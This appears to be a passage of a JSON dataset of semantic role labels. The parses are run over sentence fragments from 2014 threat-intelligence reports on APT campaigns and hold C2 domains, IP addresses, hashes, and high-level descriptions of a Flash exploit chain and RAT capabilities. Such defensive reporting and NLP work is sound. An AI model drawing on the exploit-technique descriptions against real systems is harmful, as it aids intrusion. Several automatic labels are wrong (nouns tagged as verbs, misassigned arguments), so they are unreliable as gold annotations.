"We"}, "V": {"text": "detect", "index": 1}, "ARG1": {"text": "this payload"}, "ARG2": {"text": "as Backdoor . APT.PISCES"}}, "used": {"ARG0": {"text": "it"}, "V": {"text": "used", "index": 10}, "ARG1": {"text": "hk.java-se[.]com"}, "ARG2": {"text": "for C2"}}}, "\n24, 2014, all five of the known active control servers were issuing commands to cease the attacks": {"known": {"V": {"text": "known", "index": 8}, "ARG1": {"text": "active control servers"}}, "were": {"V": {"text": "were", "index": 12}}, "issuing": {"ARGM-TMP": {"text": "24/ 2014"}, "ARG0": {"text": "all five of the known active control servers"}, "V": {"text": "issuing", "index": 13}, "ARG1": {"text": "commands"}, "ARGM-PRP": {"text": "to cease the attacks"}}, "cease": {"V": {"text": "cease", "index": 16}, "ARG1": {"text": "the attacks"}}}, " Each sample we identified is signed with digital\ncertificates that have also been used by APT actors to sign binaries in previous intrusion operations:\n<figure></figure>\n\fThese binaries are W32 Cabinet self-extracting files that drop a variant of an older DDoS tool known as\nKernelBot ": {"identified": {"ARG1": {"text": "Each sample"}, "ARG0": {"text": "we"}, "V": {"text": "identified", "index": 3}}, "is": {"V": {"text": "is", "index": 4}}, "signed": {"ARG1": {"text": "Each sample we identified"}, "V": {"text": "signed", "index": 5}, "ARG2": {"text": "with digital certificates that have also been used by APT actors to sign binaries in previous intrusion operations"}}, "have": {"V": {"text": "have", "index": 10}}, "been": {"V": {"text": "been", "index": 12}}, "used": {"ARG1": {"text": "digital certificates"}, "R-ARG1": {"text": "that"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "used", "index": 13}, "ARG0": {"text": "by APT actors"}, "ARG2": {"text": "to sign binaries in previous intrusion operations"}}, "sign": {"ARG0": {"text": "that"}, "V": {"text": "sign", "index": 18}, "ARG1": {"text": "binaries"}, "ARGM-LOC": {"text": "in previous intrusion operations"}}, "are": {"ARG1": {"text": "These binaries"}, "V": {"text": "are", "index": 27}, "ARG2": {"text": "W32 Cabinet self - extracting files that drop a variant of an older DDoS tool known as KernelBot"}}, "extracting": {"V": {"text": "extracting", "index": 32}, "ARG0": {"text": "files"}}, "drop": {"ARG0": {"text": "W32 Cabinet self - extracting files"}, "R-ARG0": {"text": "that"}, "V": {"text": "drop", "index": 35}, "ARG1": {"text": "a variant of an older DDoS tool known as KernelBot"}}, "known": {"ARG1": {"text": "an older DDoS tool"}, "V": {"text": "known", "index": 43}, "ARG2": {"text": "as KernelBot"}}}, " According to other reports, Next Media\u2019s network has suffered a \u201ctotal failure\u201d as\na result of these attacks": {"According": {"V": {"text": "According", "index": 0}}, "has": {"V": {"text": "has", "index": 9}}, "suffered": {"ARGM-ADV": {"text": "According to other reports"}, "ARG0": {"text": "Next Media \u2019s network"}, "V": {"text": "suffered", "index": 10}, "ARG1": {"text": "a \u201c total failure \u201d"}, "ARGM-CAU": {"text": "as a result of these attacks"}}}, " This particular variant called back to a command and control server located at\nnewss[.]effers[.]com": {"called": {"ARG0": {"text": "This particular variant"}, "V": {"text": "called", "index": 3}, "ARG2": {"text": "to a command and control server located at newss[.]effers[.]com"}}, "located": {"ARG1": {"text": "a command and control server"}, "V": {"text": "located", "index": 11}, "ARGM-LOC": {"text": "at newss[.]effers[.]com"}}}, " Then,\nwhen the shellcode is executed, the malware creates files \u201csqlrenew.txt\u201d and \u201cstream.exe\u201d": {"is": {"V": {"text": "is", "index": 5}}, "executed": {"ARGM-TMP": {"text": "when"}, "ARG1": {"text": "the shellcode"}, "V": {"text": "executed", "index": 6}}, "creates": {"ARGM-TMP": {"text": "Then/ when the shellcode is executed"}, "ARG0": {"text": "the malware"}, "V": {"text": "creates", "index": 10}, "ARG1": {"text": "files \u201c sqlrenew.txt \u201d and \u201c stream.exe \u201d"}}}, " The attacker then overwrites the vftable\npointer of a flash.Media.Sound() object in memory to point to the pivot and begin ROP": {"overwrites": {"ARG0": {"text": "The attacker"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "overwrites", "index": 3}, "ARG1": {"text": "the vftable pointer of a flash . Media . Sound ( ) object in memory to point to the pivot and begin ROP"}}, "point": {"ARG0": {"text": "Sound ( ) object in"}, "V": {"text": "point", "index": 20}, "ARG2": {"text": "to the pivot"}}, "begin": {"V": {"text": "begin", "index": 25}, "ARG1": {"text": "ROP"}}}, " We also observed another \u201cHTTPS\u201d Gh0st variant connecting to\na related command and control server at me[.]scieron[.]com": {"observed": {"ARG0": {"text": "We"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "observed", "index": 2}, "ARG1": {"text": "another \u201c HTTPS \u201d Gh0st variant connecting to a related command and control server at me[.]scieron[.]com"}}, "connecting": {"ARG1": {"text": "another \u201c HTTPS \u201d Gh0st variant"}, "V": {"text": "connecting", "index": 9}, "ARG2": {"text": "to a related command and control server at me[.]scieron[.]com"}}}, " The\nvulnerability allows the attacker to modify one byte of memory at an arbitrary address": {"allows": {"ARG0": {"text": "The vulnerability"}, "V": {"text": "allows", "index": 2}, "ARG1": {"text": "the attacker to modify one byte of memory at an arbitrary address"}}, "modify": {"ARG0": {"text": "the attacker"}, "V": {"text": "modify", "index": 6}, "ARG1": {"text": "one byte of memory"}, "ARGM-LOC": {"text": "at an arbitrary address"}}}, "<doc>\n<section>\n<heading>\nOperation SnowMan: DeputyDog Actor Compromises US Veterans of\nForeign Wars Website</heading>\nOn February 11, FireEye identified a zero-day exploit (CVE-2014-0322) being served up from the U.S": {"identified": {"ARGM-TMP": {"text": "On February 11"}, "ARG0": {"text": "FireEye"}, "V": {"text": "identified", "index": 5}, "ARG1": {"text": "a zero - day exploit ( CVE-2014 - 0322 ) being served up from the U.S"}}, "being": {"V": {"text": "being", "index": 16}}, "served": {"V": {"text": "served", "index": 17}, "ARG2": {"text": "from the U.S"}}}, "\n</section>\n<section>\n<heading>ZxShell payload analysis</heading>\n\nAs documented above, this exploit dropped an XOR (0\u00d795) payload that executed a ZxShell backdoor\n(MD5: 8455bbb9a210ce603a1b646b0d951bce)": {"documented": {"V": {"text": "documented", "index": 1}, "ARGM-LOC": {"text": "above"}}, "dropped": {"ARGM-MNR": {"text": "As documented above"}, "ARG0": {"text": "this exploit"}, "V": {"text": "dropped", "index": 6}, "ARG1": {"text": "an XOR ( 0\u00d795 ) payload that executed a ZxShell backdoor ( MD5"}, "ARG4": {"text": ": 8455bbb9a210ce603a1b646b0d951bce )"}}, "executed": {"ARG0": {"text": "0\u00d795 ) payload"}, "R-ARG0": {"text": "that"}, "V": {"text": "executed", "index": 14}, "ARG1": {"text": "a ZxShell"}, "ARG2": {"text": "backdoor ( MD5"}}}, "\n</section>\n<section>\n<heading>Infrastructure analysis</heading>\n\nThe info[.]flnet[.]org domain overlaps with icybin[.]flnet[.]org and book[.]flnet[.]org via the previous\nresolutions to the following IP addresses:\n<list>\n      58.64.200.178\n      58.64.200.179\n      103.20.192.4\n</list>\n<table>\nFirst Seen       Last Seen         CnC Domain           IP\n2013-08-31       2013-08-31        icybin.flnet[.]org   58.64.200.178\n2013-05-02       2013-08-02        info.flnet[.]org     58.64.200.178\n2013-08-02       2013-08-02        book.flnet[.]org     58.64.200.178\n2013-08-10       2013-08-10        info.flnet[.]org     58.64.200.179\n2013-07-15       2013-07-15        icybin.flnet[.]org   58.64.200.179\n2014-01-02       2014-01-02        book.flnet[.]org     103.20.192.4\n2013-12-03       2014-01-02        info.flnet[.]org     103.20.192.4\n</table>\nWe previously observed Gh0stRat samples with the custom packet flag \u201cHTTPS\u201d calling back to\nbook[.]flnet[.]org and icybin[.]flnet[.]org": {"observed": {"ARG0": {"text": "We"}, "ARGM-TMP": {"text": "previously"}, "V": {"text": "observed", "index": 2}, "ARG1": {"text": "Gh0stRat samples with the custom packet flag \u201c HTTPS \u201d calling back to book[.]flnet[.]org and icybin[.]flnet[.]org"}}, "Gh0stRat": {"ARG0": {"text": "We"}, "V": {"text": "Gh0stRat", "index": 3}, "ARG1": {"text": "samples"}, "ARG3": {"text": "with"}, "ARGM-ADV": {"text": "back to book[.]flnet[.]org"}}, "calling": {"ARG0": {"text": "We"}, "V": {"text": "calling", "index": 13}, "ARGM-DIR": {"text": "back"}, "ARG2": {"text": "to book[.]flnet[.]org and icybin[.]flnet[.]org"}}}, "\n\nThe ZxShell backdoor is a widely used and publicly available tool used by multiple threat actors linked to\ncyber espionage operations": {"is": {"ARG1": {"text": "The ZxShell"}, "ARGM-ADV": {"text": "backdoor"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "a widely used and publicly available tool used by multiple threat actors linked to cyber espionage operations"}}, "used": {"ARGM-MNR": {"text": "widely"}, "V": {"text": "used", "index": 6}}, "used_2": {"ARG1": {"text": "a widely used and publicly available tool"}, "V": {"text": "used", "index": 11}, "ARG0": {"text": "by multiple threat actors linked to cyber espionage operations"}}, "linked": {"ARG1": {"text": "multiple threat actors"}, "V": {"text": "linked", "index": 16}, "C-ARG1": {"text": "to cyber espionage operations"}}}, " Specifically, visitors to the VFW website were\nsilently redirected through an iframe to the exploit at www.[REDACTED].com/Data/img/img.html": {"were": {"V": {"text": "were", "index": 7}}, "redirected": {"ARGM-ADV": {"text": "Specifically/ through an iframe to the exploit at www.[REDACTED].com / Data / img / img.html"}, "ARG2": {"text": "visitors to the VFW website"}, "V": {"text": "redirected", "index": 9}}}, "\n</section>\n<section>\n<heading>Code execution</heading>\n\nOnce the attacker\u2019s code has full memory access through the corrupted Flash Vector object, the code\nsearches through loaded libraries gadgets by machine code": {"has": {"ARG0": {"text": "the attacker \u2019s code"}, "V": {"text": "has", "index": 5}, "ARG1": {"text": "full memory access through the corrupted Flash Vector object"}}, "corrupted": {"V": {"text": "corrupted", "index": 11}, "ARG1": {"text": "Flash Vector object"}}, "searches": {"ARGM-TMP": {"text": "Once the attacker \u2019s code has full memory access through the corrupted Flash Vector object"}, "ARG0": {"text": "the code"}, "V": {"text": "searches", "index": 18}, "ARGM-MNR": {"text": "through loaded libraries gadgets by machine code"}}}, " \u201csqlrenew.txt\u201d is then executed with the LoadLibraryA\nWindows API call": {"is": {"V": {"text": "is", "index": 3}}, "executed": {"ARG1": {"text": "\u201c sqlrenew.txt \u201d"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "executed", "index": 5}, "ARGM-MNR": {"text": "with the LoadLibraryA Windows API call"}}, "call": {"ARG1": {"text": "the LoadLibraryA Windows"}, "ARGM-REC": {"text": "API"}, "V": {"text": "call", "index": 11}}}, "\n</section>\n<section>\n<heading>ASLR bypass</heading>\n\nBecause the vulnerability allows attackers to modify memory to an arbitrary address, the attacker can use\nit to bypass ASLR": {"allows": {"ARG0": {"text": "the vulnerability"}, "V": {"text": "allows", "index": 3}, "ARG1": {"text": "attackers to modify memory to an arbitrary address"}}, "modify": {"ARG0": {"text": "attackers"}, "V": {"text": "modify", "index": 6}, "ARG1": {"text": "memory"}, "ARG2": {"text": "to an arbitrary address"}}, "can": {"V": {"text": "can", "index": 15}}, "use": {"ARGM-CAU": {"text": "Because the vulnerability allows attackers to modify memory to an arbitrary address"}, "ARG0": {"text": "the attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "use", "index": 16}, "ARG1": {"text": "it"}, "ARG2": {"text": "to bypass ASLR"}}, "bypass": {"ARG0": {"text": "the attacker"}, "V": {"text": "bypass", "index": 19}, "ARGM-PRD": {"text": "ASLR"}}}, " The attacker uses\nthe vulnerability to do the following:\n<list>\n      Gain access to memory from Flash ActionScript, bypassing address space layout randomization\n      (ASLR)\n      Pivot to a return-oriented programing (ROP) exploit technique to bypass data execution prevention\n      (DEP)\n</list>\n</section>\n\n\f\n<section>\n<heading>EMET detection</heading>\n\nThe attacker uses the Microsoft.XMLDOM ActiveX control to load a one-line XML string containing a file\npath to the EMET DLL": {"uses": {"ARG0": {"text": "The attacker"}, "V": {"text": "uses", "index": 2}, "ARG1": {"text": "the vulnerability"}, "ARG2": {"text": "to do the following"}}, "do": {"ARG0": {"text": "The attacker"}, "V": {"text": "do", "index": 6}, "ARG1": {"text": "the following"}}, "following": {"V": {"text": "following", "index": 8}}, "uses_2": {"ARG0": {"text": "The attacker"}, "V": {"text": "uses", "index": 12}, "ARG1": {"text": "the Microsoft . XMLDOM ActiveX control"}, "ARG2": {"text": "to load a one - line XML string containing a file path to the EMET DLL"}}, "load": {"ARG0": {"text": "The attacker"}, "V": {"text": "load", "index": 20}, "ARG2": {"text": "a one - line XML string containing a file path to the EMET DLL"}}, "containing": {"ARG0": {"text": "a one - line XML string"}, "V": {"text": "containing", "index": 27}, "ARG1": {"text": "a file path to the EMET DLL"}}}, "\n\nYou may recall that dll[.]freshdns[.]org, ali[.]blankchair[.]com and cht[.]blankchair[.]com were all linked\nto both Operation DeputyDog and Operation Ephemeral Hydra": {"may": {"V": {"text": "may", "index": 1}}, "recall": {"ARG0": {"text": "You"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "recall", "index": 2}, "ARG1": {"text": "that dll[.]freshdns[.]org , ali[.]blankchair[.]com and cht[.]blankchair[.]com were all linked to both Operation DeputyDog and Operation Ephemeral Hydra"}}, "were": {"V": {"text": "were", "index": 9}}, "linked": {"ARG1": {"text": "dll[.]freshdns[.]org , ali[.]blankchair[.]com and cht[.]blankchair[.]com"}, "ARGM-ADV": {"text": "all"}, "V": {"text": "linked", "index": 11}, "C-ARG1": {"text": "to both Operation DeputyDog and Operation Ephemeral Hydra"}}}, " government entities\n      Japanese firms\n      Defense industrial base (DIB) companies\n      Law firms\n      Information technology (IT) companies\n      Mining companies\n      Non-governmental organizations (NGOs)\n</list>\nThe proven ability to successfully deploy a number of different private and public RATs using zero-day\nexploits against high-profile targets likely indicates that": {"proven": {"V": {"text": "proven", "index": 29}, "ARG1": {"text": "ability"}}, "deploy": {"ARGM-MNR": {"text": "successfully"}, "V": {"text": "deploy", "index": 33}, "ARG1": {"text": "a number of different private and public RATs"}, "ARGM-PRP": {"text": "using zero"}, "ARGM-ADV": {"text": "- day exploits against high - profile targets likely"}}, "using": {"V": {"text": "using", "index": 42}, "ARG1": {"text": "zero - day exploits"}, "ARG2": {"text": "against high - profile targets likely"}}, "indicates": {"ARG0": {"text": "high - profile targets likely"}, "V": {"text": "indicates", "index": 53}, "ARG1": {"text": "that"}}}, "\n\fThey build ROP chains and shellcode the same way, both choose to corrupt a Flash Vector object, have\nsome identical functions with common typos, and even share the same name": {"build": {"ARG0": {"text": "They"}, "V": {"text": "build", "index": 1}, "ARG1": {"text": "ROP chains and shellcode"}, "ARGM-MNR": {"text": "the same way"}}, "shellcode": {"ARG0": {"text": "They"}, "V": {"text": "shellcode", "index": 5}, "ARGM-MNR": {"text": "the same way"}}, "choose": {"ARG0": {"text": "both"}, "V": {"text": "choose", "index": 11}, "ARG1": {"text": "to corrupt a Flash Vector object"}}, "corrupt": {"ARG0": {"text": "both"}, "V": {"text": "corrupt", "index": 13}, "ARG1": {"text": "a Flash Vector object"}}, "have": {"ARG0": {"text": "They build ROP chains and shellcode"}, "ARGM-MNR": {"text": "the same"}, "V": {"text": "have", "index": 19}, "ARG1": {"text": "some identical functions with common typos"}}, "share": {"ARG0": {"text": "They"}, "ARGM-ADV": {"text": "even"}, "V": {"text": "share", "index": 29}, "ARG1": {"text": "the same name"}}}, " The tail of the\nimage file is decoded, and written to these files": {"is": {"V": {"text": "is", "index": 6}}, "decoded": {"ARG1": {"text": "The tail of the image file"}, "V": {"text": "decoded", "index": 7}}, "written": {"ARG1": {"text": "The tail of the image file"}, "V": {"text": "written", "index": 10}, "ARG2": {"text": "to these files"}}}, " It aborts exploitation if the user is browsing with a different\nversion of IE or has installed Microsoft\u2019s Experience Mitigation Toolkit (EMET)": {"aborts": {"ARG0": {"text": "It"}, "V": {"text": "aborts", "index": 1}, "ARG1": {"text": "exploitation"}, "ARGM-ADV": {"text": "if the user is browsing with a different version of IE"}}, "is": {"V": {"text": "is", "index": 6}}, "browsing": {"ARG0": {"text": "the user"}, "V": {"text": "browsing", "index": 7}, "ARG1": {"text": "with a different version of IE"}}, "has": {"V": {"text": "has", "index": 15}}, "installed": {"ARG0": {"text": "the user"}, "V": {"text": "installed", "index": 16}, "ARG1": {"text": "Microsoft \u2019s Experience Mitigation Toolkit ( EMET )"}}}, "\n</section>\n<section>\n<heading>Shellcode analysis</heading>\n\nSubsequently, the malicious Flash code downloads a file containing the dropped malware payload": {"downloads": {"ARGM-TMP": {"text": "Subsequently"}, "ARG0": {"text": "the malicious Flash code"}, "V": {"text": "downloads", "index": 6}, "ARG1": {"text": "a file containing the dropped malware payload"}}, "containing": {"ARG0": {"text": "a file"}, "V": {"text": "containing", "index": 9}, "ARG1": {"text": "the dropped malware payload"}}, "dropped": {"V": {"text": "dropped", "index": 11}}}, "\n\nGiven the information above we can reasonably assume that this malware was most likely designed as a\nfirst stage implant": {"Given": {"V": {"text": "Given", "index": 0}, "ARG1": {"text": "the information above"}}, "can": {"V": {"text": "can", "index": 5}}, "assume": {"ARGM-ADV": {"text": "Given the information above"}, "ARG0": {"text": "we"}, "ARGM-MOD": {"text": "can"}, "ARGM-MNR": {"text": "reasonably"}, "V": {"text": "assume", "index": 7}, "ARG1": {"text": "that this malware was most likely designed as a first stage implant"}}, "was": {"ARG1": {"text": "this malware"}, "V": {"text": "was", "index": 11}, "ARG2": {"text": "most likely designed as a first stage implant"}}, "designed": {"ARG1": {"text": "this malware"}, "ARGM-ADV": {"text": "most likely"}, "V": {"text": "designed", "index": 14}, "ARG2": {"text": "as a first stage implant"}}}, " Once the payload text has been decrypted the malware treats this as a binary executable\nfile, which is then written to the disk and executed": {"has": {"V": {"text": "has", "index": 4}}, "been": {"V": {"text": "been", "index": 5}}, "decrypted": {"ARGM-TMP": {"text": "Once"}, "ARG0": {"text": "the payload text"}, "V": {"text": "decrypted", "index": 6}, "ARG1": {"text": "the malware treats"}}, "is": {"V": {"text": "is", "index": 18}}, "written": {"ARG1": {"text": "a binary executable file"}, "R-ARG1": {"text": "which"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "written", "index": 20}, "ARGM-LOC": {"text": "to the disk"}}, "executed": {"ARG1": {"text": "a binary executable file"}, "R-ARG1": {"text": "which"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "executed", "index": 25}}}, " With many pieces of\nmalware the initial communications that it sends out to its command and control server (known as\nbeaconing or phoning home) usually include pieces of information about the victim system": {"sends": {"ARG1": {"text": "the initial communications"}, "R-ARG1": {"text": "that"}, "ARG0": {"text": "it"}, "V": {"text": "sends", "index": 10}, "ARGM-DIR": {"text": "out"}, "ARG2": {"text": "to its command and control server ( known as beaconing or phoning home )"}}, "known": {"ARG1": {"text": "its command and control server ("}, "V": {"text": "known", "index": 19}, "ARG2": {"text": "as beaconing or phoning home )"}}, "beaconing": {"V": {"text": "beaconing", "index": 21}, "ARG1": {"text": "home/ )"}}, "phoning": {"V": {"text": "phoning", "index": 23}, "ARG1": {"text": "home )"}}, "include": {"ARGM-ADV": {"text": "With many"}, "ARG2": {"text": "its command and control server ( known as beaconing or phoning home )"}, "ARGM-TMP": {"text": "usually"}, "V": {"text": "include", "index": 27}, "ARG1": {"text": "pieces of information about the victim system"}}}, " The first set of commands force the malware to behave\nas a simple downloader": {"force": {"ARG0": {"text": "The first set of commands"}, "V": {"text": "force", "index": 5}, "ARG1": {"text": "the malware"}, "ARG2": {"text": "to behave as a simple downloader"}}, "behave": {"ARG0": {"text": "the malware"}, "V": {"text": "behave", "index": 9}, "ARG1": {"text": "as a simple downloader"}}}, "\n<figure></figure>\n\n\f(A screenshot showing the structure of the command and control routines within OrcaRAT)\n\nThe command and control structure is fairly simplistic but provides the operator with access to the victim\nmachine\u2019s filesystem and command line, and as such allows the attacker to perform various tasks such as\nexecuting arbitrary commands or uploading and downloading files from the compromised system": {"showing": {"ARG0": {"text": "A screenshot"}, "V": {"text": "showing", "index": 3}, "ARG1": {"text": "the structure of the command and control routines within OrcaRAT )"}}, "is": {"ARG1": {"text": "The command and control structure"}, "V": {"text": "is", "index": 20}, "ARG2": {"text": "fairly simplistic"}}, "provides": {"ARG0": {"text": "the structure of the command and control routines within OrcaRAT"}, "V": {"text": "provides", "index": 24}, "ARG2": {"text": "the operator"}, "ARG1": {"text": "with access to the victim machine \u2019s filesystem and command line"}}, "allows": {"ARG0": {"text": "such"}, "V": {"text": "allows", "index": 42}, "ARG1": {"text": "the attacker to perform various tasks such as executing arbitrary commands or uploading and downloading files from the compromised system"}}, "perform": {"ARG0": {"text": "the attacker"}, "V": {"text": "perform", "index": 46}, "ARG1": {"text": "various tasks such as executing arbitrary commands or uploading and downloading files from the compromised system"}}, "executing": {"ARG0": {"text": "the attacker"}, "V": {"text": "executing", "index": 51}, "ARG1": {"text": "arbitrary commands"}}, "uploading": {"ARG0": {"text": "the attacker"}, "V": {"text": "uploading", "index": 55}, "ARGM-DIR": {"text": "from the compromised system"}}, "downloading": {"ARG0": {"text": "the attacker"}, "V": {"text": "downloading", "index": 57}, "ARG1": {"text": "files"}, "ARG2": {"text": "from the compromised system"}}, "compromised": {"V": {"text": "compromised", "index": 61}, "ARG1": {"text": "system"}}}, "\n\nAfter a command and control message is received, OrcaRAT sends an HTTP POST message back to the\ncommand and control server": {"is": {"V": {"text": "is", "index": 6}}, "received": {"ARG1": {"text": "a command and control message"}, "V": {"text": "received", "index": 7}}, "sends": {"ARGM-TMP": {"text": "After a command and control message is received"}, "V": {"text": "sends", "index": 10}, "ARG1": {"text": "an HTTP POST message"}, "ARG2": {"text": "back to the command and control server"}}}, " The randomly generated values noted above are actually used to encrypt several pieces of\ninformation that are extracted from the system, and even the key itself is included": {"generated": {"ARGM-MNR": {"text": "randomly"}, "V": {"text": "generated", "index": 2}, "ARG1": {"text": "values"}}, "noted": {"ARG1": {"text": "The randomly generated values"}, "V": {"text": "noted", "index": 4}, "ARGM-LOC": {"text": "above"}}, "are": {"V": {"text": "are", "index": 6}}, "used": {"ARG1": {"text": "The randomly generated values noted above"}, "ARGM-ADV": {"text": "actually"}, "V": {"text": "used", "index": 8}, "ARG2": {"text": "to encrypt several pieces of information that are extracted from the system"}}, "encrypt": {"V": {"text": "encrypt", "index": 10}, "ARG1": {"text": "several pieces of information that are extracted from the system"}}, "are_2": {"V": {"text": "are", "index": 16}}, "extracted": {"ARG1": {"text": "several pieces of information"}, "R-ARG1": {"text": "that"}, "V": {"text": "extracted", "index": 17}, "ARG2": {"text": "from the system"}}, "is": {"V": {"text": "is", "index": 27}}, "included": {"ARG1": {"text": "even the key itself"}, "V": {"text": "included", "index": 28}}}, " However, they also demonstrate the value of tracking\nthese threats over time, as this allowed us to uncover and properly attribute the new IOCs because Nitro\nwas still re-using": {"demonstrate": {"ARGM-DIS": {"text": "However"}, "ARG0": {"text": "they"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "demonstrate", "index": 4}, "ARG1": {"text": "the value of tracking these threats over time"}, "ARGM-CAU": {"text": "as this allowed us to uncover and properly attribute the new IOCs because Nitro was still re - using"}}, "tracking": {"V": {"text": "tracking", "index": 8}, "ARG1": {"text": "these threats"}, "ARGM-TMP": {"text": "over time"}}, "allowed": {"ARG0": {"text": "this"}, "V": {"text": "allowed", "index": 16}, "ARG1": {"text": "us to uncover and properly attribute the new IOCs because Nitro was still re - using"}}, "uncover": {"ARG0": {"text": "us"}, "V": {"text": "uncover", "index": 19}, "ARG1": {"text": "the new IOCs"}, "ARGM-CAU": {"text": "because Nitro was still re - using"}}, "attribute": {"ARG0": {"text": "us"}, "ARGM-MNR": {"text": "properly"}, "V": {"text": "attribute", "index": 22}, "ARG1": {"text": "the new IOCs"}, "ARGM-CAU": {"text": "because Nitro was still re - using"}}, "was": {"V": {"text": "was", "index": 28}, "ARGM-TMP": {"text": "still"}, "ARG2": {"text": "re"}}, "re": {"ARG1": {"text": "Nitro"}, "ARGM-TMP": {"text": "still"}, "V": {"text": "re", "index": 30}, "ARGM-MNR": {"text": "using"}}, "-": {"ARGM-TMP": {"text": "still"}, "ARGM-MNR": {"text": "re/ using"}, "V": {"text": "-", "index": 31}}, "using": {"ARGM-MNR": {"text": "re"}, "V": {"text": "using", "index": 32}}}, "\n\nTable 7\n<table>\n SHA256         ffbddfb536e8e604c880ec977d06f804a500fc0396899bd2c195fb1f5b74207a\n MD5            a3b2e34973691ad320b70248bd67fbd2\n File Name      CitrixReceiverWeb.exe\n File Size      192512\n First Seen     2014-03-12 06:58:22\n C2 URL         zip.redirectme[.]net\n Resolution     196.45.144.12\n</table>\nAs this post and previous cited research show, APT groups such as Nitro will continue to evolve their\ntechniques within the kill chain to avoid detection": {"cited": {"V": {"text": "cited", "index": 7}, "ARG1": {"text": "research show"}}, "will": {"V": {"text": "will", "index": 16}}, "continue": {"ARGM-DIS": {"text": "Table"}, "ARGM-ADV": {"text": "7 As this post and previous cited research show"}, "ARG0": {"text": "APT groups such as Nitro"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "continue", "index": 17}, "ARG1": {"text": "to evolve their techniques within the kill chain to avoid detection"}}, "evolve": {"ARG0": {"text": "APT groups such as Nitro"}, "V": {"text": "evolve", "index": 19}, "ARG1": {"text": "their techniques"}, "ARG2": {"text": "within the kill chain"}, "ARGM-PRP": {"text": "to avoid detection"}}, "avoid": {"ARG0": {"text": "APT groups such as Nitro"}, "V": {"text": "avoid", "index": 27}, "ARG1": {"text": "detection"}}}, "\n\nTable 4\n<table>\n SHA256        e7f2af8c48f837da57000c068368d77bc9b06eba1e077edfab58df6aa2ea40ec\n MD5           271e6a4d45c2817f86148ca413f97604\n File Name     mdm.exe\n File Size     118784\n First Seen    2014-05-20 08:43:15\n C2 URL        zipoo.redirectme[.]net\n Resolution    196.45.144.12\n</table>\nTable 5\n<table>\n SHA256         e601da16f923b33465dbafbff9d47195e8fc50099fd0581a16a1745bf890afb6\n MD5            be765cd5723e4366d35172aaf13fad44\n File Name      CitrixReceiverWeb.exe\n File Size      135168\n First Seen     2014-05-15 16:34:10\n C2 URL         zipoo.redirectme[.]net\n Resolution     196.45.144.12\n</table>\nThe malware dropped was configured to use good.myftp[.]org as the C2 URL, and the IP resolution was\n223.25.233.248": {"dropped": {"ARG1": {"text": "The malware"}, "V": {"text": "dropped", "index": 4}}, "was": {"ARG1": {"text": "Table 4 The malware dropped"}, "V": {"text": "was", "index": 5}, "ARG2": {"text": "configured to use good.myftp[.]org as the C2 URL"}}, "configured": {"ARG1": {"text": "Table 4 The malware dropped"}, "V": {"text": "configured", "index": 6}, "ARG4": {"text": "to use good.myftp[.]org as the C2 URL"}}, "use": {"V": {"text": "use", "index": 8}, "ARG1": {"text": "good.myftp[.]org as the C2 URL"}}, "was_2": {"ARG1": {"text": "the IP resolution"}, "V": {"text": "was", "index": 19}, "ARG2": {"text": "223.25.233.248"}}}, "\n\n    There are only two options we can think of here:\n       \uf0b7 Someone from the same company has been targeted with this document": {"are": {"V": {"text": "are", "index": 1}, "ARG1": {"text": "only two options we can think of here"}}, "can": {"ARG0": {"text": "we"}, "V": {"text": "can", "index": 6}, "ARG1": {"text": "think"}}, "think": {"ARG0": {"text": "we"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "think", "index": 7}, "ARG1": {"text": "of"}, "ARGM-LOC": {"text": "here"}}, "has": {"V": {"text": "has", "index": 17}}, "been": {"V": {"text": "been", "index": 18}}, "targeted": {"ARG2": {"text": "Someone from the same company"}, "V": {"text": "targeted", "index": 19}, "ARG1": {"text": "with this document"}}}, " Usual RAT features are implemented:\n<list>\n       - File Download (GET) and Upload (PUT)\n       - Remote shell (ocmd/ccmd)\n       - Configuration update (cfg)\n       - Sleep (sleep)\n</list>\n</section>\n<section>\n    <heading>Version and author(s)</heading>\n\n    Regarding the configuration, our sample communicates with \u201csop.avstore.com.tw\u201d, and contains the\n    string \u201cNov 13 2013\u201d, which should be a version identifier": {"are": {"V": {"text": "are", "index": 3}}, "implemented": {"ARG1": {"text": "Usual RAT features"}, "V": {"text": "implemented", "index": 4}}, "Regarding": {"V": {"text": "Regarding", "index": 6}, "ARG1": {"text": "the configuration"}}, "contains": {"ARGM-ADV": {"text": "Regarding the configuration"}, "ARG0": {"text": "our sample"}, "V": {"text": "contains", "index": 19}, "ARG1": {"text": "the string \u201c Nov 13 2013 \u201d , which should be a version identifier"}}, "should": {"V": {"text": "should", "index": 29}}, "be": {"ARG1": {"text": "the string \u201c Nov 13 2013 \u201d"}, "R-ARG1": {"text": "which"}, "ARGM-MOD": {"text": "should"}, "V": {"text": "be", "index": 30}, "ARG2": {"text": "a version identifier"}}}, " The IP addresses are in an ADSL dynamic pool:\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 41/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<figure></figure>\n\n                                  <caption>IP addresses used by the FLY-THINK machine</caption>\n\n\n\n    Most of the connections to the c&c server were coming from a computer named 50PZ80C-\n    1DFDCB8 with several IP addresses": {"are": {"ARG1": {"text": "The IP addresses"}, "V": {"text": "are", "index": 3}, "ARG2": {"text": "in an ADSL dynamic pool"}}, "were": {"V": {"text": "were", "index": 18}}, "coming": {"ARG1": {"text": "Most of the connections to the c&c server"}, "V": {"text": "coming", "index": 19}, "ARG2": {"text": "from a computer named 50PZ80C- 1DFDCB8"}, "ARGM-ADV": {"text": "with several IP addresses"}}, "named": {"ARG1": {"text": "a computer"}, "V": {"text": "named", "index": 23}, "ARG2": {"text": "50PZ80C-"}}}, "\n\n    Once this data has been transferred to the c&c server, it responds by sending additional malware to\n    execute on the machine": {"has": {"V": {"text": "has", "index": 3}}, "been": {"V": {"text": "been", "index": 4}}, "transferred": {"ARG1": {"text": "this data"}, "V": {"text": "transferred", 